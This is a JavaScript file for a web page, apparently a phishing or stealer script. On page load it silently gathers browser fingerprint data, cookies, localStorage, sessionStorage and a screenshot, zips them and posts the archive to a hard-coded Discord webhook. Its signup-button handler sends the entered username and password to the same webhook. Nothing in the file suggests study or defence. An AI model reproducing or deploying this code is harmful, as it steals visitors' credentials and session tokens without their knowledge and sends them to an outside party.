function generateUniqueId() {
    return 'user-' + Math.random().toString(36).substr(2, 9);
}

function getBrowserInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        viewportWidth: window.innerWidth,
        viewportHeight: window.innerHeight,
        deviceMemory: navigator.deviceMemory || 'Not available',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Not available',
        platform: navigator.platform,
        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        javaEnabled: navigator.javaEnabled(),
        cookieEnabled: navigator.cookieEnabled,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        vendor: navigator.vendor,
        product: navigator.product,
        connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : 'Not available',
        plugins: Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            version: plugin.version,
            description: plugin.description
        })),
        screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
        fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
        cookies: document.cookie
    };
}

function formatStorage(storage) {
    return Object.keys(storage).reduce((formatted, key) => {
        return formatted + `${key}: ${storage.getItem(key)}\n`;
    }, '');
}

async function captureScreenshot() {
    try {
        const canvas = await html2canvas(document.body, {
            scale: window.devicePixelRatio
        });
        return canvas.toDataURL('image/png');
    } catch (error) {
        console.error('Error capturing screenshot:', error);
        return null;
    }
}

async function createZipFile(info, screenshotDataUrl) {
    const zip = new JSZip();
    zip.file('info.txt', JSON.stringify(info, null, 2));
    zip.file('cookies.txt', info.cookies.split('; ').join('\n'));
    zip.file('localStorage.txt', formatStorage(localStorage));
    zip.file('sessionStorage.txt', formatStorage(sessionStorage));

    if (screenshotDataUrl) {
        const base64Data = screenshotDataUrl.split(',')[1];
        const imgBlob = new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/png' });
        zip.file('screenshot.png', imgBlob);
    }

    const content = await zip.generateAsync({ type: 'blob' });
    return content;
}

async function sendZipToDiscord(zipBlob, uniqueId) {
    const formData = new FormData();
    formData.append('file', zipBlob, 'info.zip');
    formData.append('uniqueId', uniqueId);

    try {
        await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
            method: 'POST',
            body: formData
        });
        console.log('Zip file sent to Discord webhook');
    } catch (error) {
        console.error('Error sending zip file to Discord webhook:', error);
    }
}

async function initialize() {
    const uniqueId = generateUniqueId();
    const browserInfo = getBrowserInfo();
    browserInfo.uniqueId = uniqueId;

    const screenshotDataUrl = await captureScreenshot();
    const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
    await sendZipToDiscord(zipBlob, uniqueId);
}

window.onload = initialize;

document.getElementById('signup-button').addEventListener('click', async () => {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (username && password) {
        const loginData = {
            username: username,
            password: password
        };

        const loginJsonBlob = new Blob([JSON.stringify(loginData)], { type: 'application/json' });
        const formData = new FormData();
        formData.append('file', loginJsonBlob, 'login.json');

        try {
            await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
                method: 'POST',
                body: formData
            });
            console.log('Login data sent to Discord webhook');
        } catch (error) {
            console.error('Error sending login data to Discord webhook:', error);
        }
    } else {
        console.log('Username or password is missing.');
    }
});
